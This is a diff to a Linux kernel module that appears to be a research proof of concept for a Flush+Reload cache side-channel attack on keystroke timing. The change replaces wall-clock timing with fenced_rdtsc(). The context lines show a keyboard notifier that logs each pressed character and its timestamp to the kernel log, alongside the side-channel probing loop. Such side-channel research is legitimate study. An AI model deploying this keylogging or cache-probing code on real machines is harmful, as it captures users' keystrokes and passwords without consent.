@@ -37,9 +37,9 @@ void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }
 int flush_reload_t(void *ptr) {
   uint64_t start = 0, end = 0;
 
-  start = ktime_get_real_ns();
+  start = fenced_rdtsc();
   maccess(ptr);
-  end = ktime_get_real_ns();
+  end = fenced_rdtsc();
 
   mfence();
 
@@ -55,7 +55,7 @@ static int keylogger_notify(struct notifier_block *nb, unsigned long action,
       (struct keyboard_notifier_param *)data;
 
   if (action == KBD_KEYSYM) { // Check if a key is pressed
-    u64 t1 = ktime_get_real_ns();
+    u64 t1 = fenced_rdtsc();
     if (param->down) {
       printk(KERN_INFO "{\'type\': \'press\', \'key-char\': \'%c\', "
                        "\'keystroke-time\': %llu}",
@@ -74,11 +74,11 @@ static int keylogger_notify(struct notifier_block *nb, unsigned long action,
 static int keystroke_timing(void *data) {
   u64 thread_start = ktime_get_seconds(); 
   u64 current_time = thread_start;
-  u64 last_hit_time = ktime_get_real_ns(); //TODO:ktime_get_real_ns
+  u64 last_hit_time = fenced_rdtsc(); //TODO:ktime_get_real_ns
   while (current_time - thread_start < EXEC_TIME) {
     u64 time = flush_reload_t((void *)(FUNCTION_ADDRESS));
     if (time < threshold) {
-      u64 current_time_ns = ktime_get_real_ns();
+      u64 current_time_ns = fenced_rdtsc();
       printk(KERN_INFO "{\'last-hit\': %llu, \'keystroke-time\': %llu}",
              current_time_ns - last_hit_time - time,
              current_time_ns - start_time -
@@ -98,7 +98,7 @@ static int keystroke_timing(void *data) {
 static int __init my_module_init(void) {
   nb.notifier_call = keylogger_notify;
   register_keyboard_notifier(&nb);
-  start_time = ktime_get_real_ns();
+  start_time = fenced_rdtsc();
   printk(KERN_INFO "flush+reload period starts: %llu", start_time);
   keystroke_timing(NULL);
   printk(KERN_INFO "flush+reload period ends");
